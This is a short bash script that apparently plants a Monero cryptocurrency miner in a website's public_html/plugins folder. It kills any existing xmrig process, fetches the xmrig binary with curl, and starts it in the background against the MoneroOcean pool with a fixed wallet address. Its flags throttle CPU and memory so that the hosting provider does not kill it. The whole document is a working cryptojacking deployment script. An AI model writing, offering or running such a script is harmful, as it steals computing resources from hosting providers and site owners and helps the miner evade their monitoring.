#!/bin/bash
WALLET=458dxk6pcKg3KR6YGVByY1FKKr88GPnz3XxQL7c7zx5UNoxAsKzMN4JJ8zbffq4LRv8dk5CXYBVAEdYBe2avS9qt7jjjKpa
# Using ./ ensures we stay in your public_html/plugins folderzzzzzz
DIR="./moneroocean"

# 1. Clean and Prepare
killall -9 xmrig 2>/dev/null
rm -rf $DIR && mkdir -p $DIR && cd $DIR

# 2. Grab the latest portable miner
curl -L "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz" | tar xz --strip-components=1

# 3. Launch with Fixes
# --no-cpu-topology: Bypasses the "sysfs cpu topology" error
# --randomx-mode=light: Keeps RAM low so the host doesn't kill it
./xmrig -o gulf.moneroocean.stream:10128 -u $WALLET -p direct-bash --cpu-max-threads-hint=50 --randomx-mode=light --no-cpu-topology -B

echo "Miner initiated. Check your pool dashboard in 10 minutes."

